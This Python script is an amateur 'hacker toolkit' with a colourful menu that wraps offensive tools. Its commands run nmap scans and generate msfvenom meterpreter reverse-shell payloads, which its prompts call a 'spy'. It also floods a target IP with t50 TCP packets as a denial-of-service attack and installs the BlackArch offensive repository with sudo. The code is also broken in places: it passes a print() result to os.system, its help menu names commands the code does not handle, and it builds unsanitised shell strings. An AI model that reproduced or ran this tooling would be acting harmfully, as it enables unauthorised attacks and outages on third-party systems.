#Required import's

import os
import time
import sys
import socket 
import json
from urllib.request import urlopen
import threading
from colorama import Fore
import getpass
import pyfiglet
import progressbar

username = 'grey_user'

def animated_marker():
  widgets = ['Plese be patient, Loading....', progressbar.AnimatedMarker()]
  bar = progressbar.ProgressBar(widgets=widgets).start()
  os.system('clear')
  for i in range(25):
    time.sleep(0.1)
    bar.update(1)

#starting screen
os.system('clear')
starting_string_first_term = pyfiglet.figlet_format("your program will start in a bit, please wait!!")
print(Fore.CYAN + starting_string_first_term)
time.sleep(2.5)
os.system("clear")



#defining detailing process /2/
check_mark = (Fore.BLUE + "[*]")
initilizer = (Fore.GREEN + 'Initilizing system...')
starter = (Fore.GREEN + 'Starting Program...')
checker = (Fore.GREEN + 'Checking Program Status...')
programm_status = (Fore.GREEN + 'Program Status : Active!!!')
activator = (Fore.GREEN + 'activating possessed requirments')

#printing detaling process /2/
print(f"{check_mark}{initilizer}"), time.sleep(0.7)
print(f"{check_mark}{starter}"), time.sleep(0.7)
print(f"{check_mark}{checker}"), time.sleep(0.7)
print(f"{check_mark}{programm_status}"), time.sleep(0.7)
print(f"{check_mark}{activator}"), time.sleep(2.5)
input(Fore.RESET + "\nenter to start !!")
time.sleep(1.3)
os.system('clear')



#TAG OR NAME of the tool
def title_of_the_tool():
  os.system("clear")
  tooltag = pyfiglet.figlet_format("GREY J TOOLKIT")
  tooltagcolor = (Fore.GREEN + tooltag)
  print(tooltagcolor)
  print(Fore.BLUE + "\t\t\tCreated by Mr. Elie Grey, Dev_status : DEVEPLOPMENT STAGE\n\t\t\tinstagram: mr._robot_01, hope you'll enjoy it!!\n\t\t\tEnter help to see menu!!")


# Starting from here the MAIN PROGAMM !!
def greyj_main():
  #defining user_input colors
  colors_define_for_using_command = (Fore.MAGENTA + '[+]')
  using_command_define = (Fore.LIGHTBLACK_EX + 'Using Command ')


  #Defining user_input
  userinput_start = str(f"|@{username}> ")
  user_input = input(Fore.CYAN + userinput_start)

  color_define_user = (Fore.LIGHTGREEN_EX + user_input)
  print(f"{colors_define_for_using_command} {using_command_define} '{color_define_user}'\n"), time.sleep(0.5)


  #help command output
  if user_input == 'help':
      print(Fore.RED + '1)enter `map` to use namp_automator!!(you need nmap install on your host machine)\n')
      print(Fore.RED + '2)enter `clear` to clear the terminal!!\n')
      print(Fore.RED + '3)enter `exit` to exit pytool!!\n')
      print(Fore.RED + '4)enter `infect` to use msfvenom_automator!!(you need metasploit installed on your host machine)\n')
      print(Fore.RED + '5)enter `myp` to see your ip addresses!!\n')
      print(Fore.RED + '6)enter `ipform` to use ip seeker!!\n')   
      print(Fore.RED + '7)enter `webdown` to use t50-daniel of service!!(you need t50 installed on your host machine)\n')     
      print(Fore.RED + '8)enter `xsetup` to download required tools NOTE:-[YOU NEED A GOOD INTERNET-CONNECTION TO DOWNLOADS ALL TOOLS, THE INSTALLATION MAY TAKE NEARLY 500-MB OF INTERNET, also this installition is different from requirments.txt file]\n')
      print(Fore.RED + '9)enter `sethacker` to load your os with blackarch repository, so you can install 2500+ hacker tools to you OS')


  #map command output
  elif user_input == 'map':

    os.system("clear")
    nmap_decore = pyfiglet.figlet_format('NMAP  AUTO')
    print(Fore.BLUE + nmap_decore)
        
        
    target_ip = input(Fore.YELLOW + 'target ip : ')
    scanning_argvs = input(Fore.YELLOW + 'enter scanning argvs : ')
        
    nmap_argv = str(f"nmap {scanning_argvs} {target_ip}")
    os.system(nmap_argv)
        
  
  #clear command output
  elif user_input == 'clear':

    os.system("clear")
    

  #exit command output
  elif user_input =='exit':
    exit()


  #infect command output
  elif user_input == "infect":
    os.system("clear")
    print("we are using msfvenom as for this argument!\n")
    try:
      platform = input(Fore.RED + "enter base/platform => ")
      session = input(Fore.RED + "enter or type 'meterpreter' => ")
      revshell = input(Fore.RED + 'enter reverse shell argumets => ')
      path = input(Fore.RED + 'enter path to store your spy ;) => ')
      payloadname = input(Fore.RED + 'enter name of the spy ;) => ')
          
      main_infect_put = print(f"msfvenom -p {platform}/{session}/{revshell} R> {path}/{payloadname}")
      os.system(main_infect_put)
    except:
      KeyboardInterrupt()

  #myp command output     
  elif user_input == "myp":
    hostname = socket.gethostname()
    ipv = socket.gethostbyname_ex(hostname)
    print(ipv, '\n')


  #ipform commad output
  elif user_input == "ipform":

    ip = input('what is your target ip: ')

    url = "http://ip-api.com/json/"
    response = urlopen(url + ip)
    data = response.read()
    values = json.loads(data)
    
    try:
        print('\nip: ' + values['query'])
        print('city: ' + values['city'])
        print('Country: ' + values['country'])
        print('region: ' + values['region'])
    
    except:
        print("""
              error in development, this part of tool is still in develpment stage,\n 
              'this is an error from the code for this program, it will be resolved soon',
              or you can try to solve it on your own!!\n\n
              We will recomend you to make a copy of this program,\n
              to insure that the original file may not get harm, if you code is successful in run,\n 
              then your can make changes in original file if you wish!!!\n\n
              WARNING - IF YOU MAKE WRONG CHANGES IN THE CODE OF ORIGINAL FILE THEN YOU HAVE TO DOWNLOAD THIS TOOL AGAIN, DO IT AT YOUR OWN RISK !!!!""")


  #t50 command output
  elif user_input == "t50":

    os.system("clear")
    t50_decore = pyfiglet.figlet_format('T50 DOS')
    print(t50_decore)

    t50_target_input = input(Fore.BLUE + 'enter targt ip : ')
    t50_command_line_output = str(f"t50 {t50_target_input} --flood --turbo -S --protocole TCP")
    os.system(t50_command_line_output)


  #xstartp command output
  elif user_input == "xsetup":
    os.system("clear")
    print(Fore.GREEN + "enter the allocated number base system which you'r using, if your are having the tool then it will get updated autmatically !!\n\n1) DEBAIN, 2) ARCH")
    xstartup_installation = int(input(Fore.CYAN + "|enter-here|=> "))
    if xstartup_installation == 1:
      os.system("sudo apt install nmap")
      os.system("sudo apt install metasploit")
      os.system("sudo apt install t50")
    elif xstartup_installation == 2:
      os.system("sudo pacman -Sy nmap")
      os.system("sudo pacman -Sy metasploit")
      os.system("sudo pacman -sy t50")


  #sethacker command output
  elif user_input == "sethacker":
    os.system("clear")
    print(Fore.RED + "THIS WILL ONLY WORK IF YOUR ARE USING AN ARCH BASED OS, DEBAIN OR OTHER WILL NOT WORK!!\n")
    os.system("pwd")
    input(Fore.BLUE + "\nis this the current directory of this tool ??\n\nif no then the tool by locating the directory!!\nif yes then press enter")
    print(Fore.CYAN + "It will take about 2 to 3 mins or more, so please be patient")
    os.system("chmod +x strap.sh")
    os.system("sudo ./strap.sh")



  #if user_input command not found!!
  else:
    print(f"Command '{user_input}' Not Found!!!\n")

  while True:
    greyj_main()
    
    
    
# initial check
def initialcheck():
  print(Fore.RED + "Setting up requirments and checking if the requirments are installed or not,\nalso giving taking the required permission,\nplese be patient !!")
  os.system("pip3 install -r requirments.txt")

#continuous program using output
if __name__ == "__main__":
  initialcheck()
  animated_marker()
  title_of_the_tool()
  greyj_main()
#end of main pogramme.
